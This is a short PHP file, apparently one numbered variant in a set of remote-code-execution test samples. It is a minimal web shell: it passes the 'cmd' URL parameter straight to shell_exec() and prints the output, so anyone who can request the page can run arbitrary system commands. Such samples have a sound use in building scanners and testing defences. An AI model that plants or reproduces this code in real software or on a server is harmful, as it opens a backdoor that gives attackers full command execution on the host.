<?php
// RCE test variation #300
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>